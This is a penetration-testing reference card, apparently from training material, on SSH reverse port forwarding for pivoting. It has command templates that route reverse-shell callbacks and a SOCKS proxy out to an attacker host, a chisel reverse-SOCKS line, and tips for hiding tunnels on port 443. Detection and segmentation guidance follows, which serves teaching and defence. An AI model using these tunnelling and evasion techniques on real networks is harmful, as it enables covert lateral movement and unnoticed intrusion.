name: SSH - Remote/Reverse Port Forwarding
description: Forwards a port on the pivot back to a service on your attack host (-R), the reverse of -L. Used to route a compromised host's callback (for example a reverse shell) through the pivot to a handler that only the attack host runs.
source: CPTS Module 12: Pivoting, Tunneling, and Port Forwarding

examples.label: OSCP Ch18 — remote port forward from compromised Linux host to Kali (bring internal service out)
OSCP Ch18 — remote dynamic SOCKS (single-port -R = SOCKS on Kali loopback)

notes: -vN gives verbose output with no remote shell. The target then connects to <pivot_ip>:<remote_port>, which tunnels to your handler. Also covered in: OSCP PEN-200 Chapter 18 (Port Redirection and SSH Tunneling). OSCP Ch18: remote port forward (-R) is run FROM the compromised host TO Kali — the reverse of -L. Format: ssh -N -R <kali_bind_ip>:<kali_port>:<internal_target_ip>:<internal_port> kali@<kali_ip>. Remote dynamic (-R <port> only, no host:port) opens a SOCKS listener on Kali's loopback on that port — combine with proxychains pointing at 127.0.0.1:<port> on Kali to reach all internal hosts.

references.title: HTB Academy - Pivoting, Tunneling, and Port Forwarding
OffSec PEN-200 - Port Redirection and SSH Tunneling

recommended.note: Chain a socat redirector for multi-hop reverse shells.
Enumerate the internal network first via dynamic SOCKS before delivering the reverse payload.

defense.why_it_works: SSH remote forwarding (ssh -R) opens a port on the SSH server that tunnels back to the attacker - useful to bring an internal host's traffic (or a reverse shell) out through the pivot.
defense.prerequisites: SSH access such that the server can connect back to the attacker (-R).
defense.impact: A reverse tunnel bringing internal services/callbacks out to the attacker.
defense.detection: [MITRE T1090.001] A compromised host relaying traffic between segments it shouldn't bridge; an unexpected listening port (SOCKS/forwarder) on the pivot; the pivot initiating connections to hosts/ports it never normally contacts; lateral flows that appear to originate from the pivot (NetFlow/east-west monitoring).
defense.artifacts: A listening port on the SSH server; a session with -R; callbacks routed to the attacker.
defense.prevention: [MITRE T1090.001 M1030 Network Segmentation] strict east-west firewall rules so one foothold can't reach other segments; egress filtering; IDS/IPS + NetFlow analysis for proxy patterns and long-lived flows; alert on unexpected listeners on servers.
defense.evasion: Tunnel over an allowed protocol/port (443) and encrypt the channel so the relay blends with normal traffic; keep the listener on a common-looking port.
defense.misconfiguration: The network lacks proper segmentation — a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.
defense.vulnerable_config:
# Network design: flat Layer-3 network, all VLANs can reach each other
# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)
# No egress proxy — direct outbound HTTP to any IP allowed

# iptables on pivot host (none blocking outbound):
iptables -L OUTPUT  # policy ACCEPT, no rules

# This allows: chisel client 10.10.10.5:8080 R:socks
# Attacker now has SOCKS5 access to the entire internal network
defense.secure_config:
# Network segmentation with explicit allow rules:
# DMZ -> Internet: only specific egress IPs (patch servers, DNS)
# DMZ -> Internal: ONLY the DB ports this specific app needs
# Internal -> Internal: segment by tier (web tier can't reach DC directly)

# Egress filtering — block all outbound except known-good:
# FortiGate / Palo Alto / iptables:
iptables -P OUTPUT DROP
iptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server
iptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns
# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length
# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams
